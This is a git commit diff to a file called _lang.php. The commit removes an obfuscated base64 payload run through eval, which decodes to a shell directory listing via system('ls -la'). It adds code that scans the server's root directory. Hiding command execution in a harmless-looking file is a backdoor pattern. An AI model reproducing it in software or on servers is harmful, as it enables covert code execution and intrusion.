d1ff4656021cd944eb4fe4e603652aca644d40fa
selasansd <49369435+selasansd@users.noreply.github.com>
2019-04-07 18:58:34 +0300

    Update _lang.php

--- _lang.php
+++ _lang.php
@@ -1,6 +1,6 @@
 <?php
 
-$c = "ZWNobyAiYXNkYXMzMzNkYXNkIjsKZWNobyAiPHByZT4iOwpzeXN0ZW0oImxzIC1sYSIpOwplY2hvICI8L3ByZT4iOwpkaWU7";
-eval(base64_decode($c));
+$path    = '/';
+$files = scandir($path);
 
 ?>
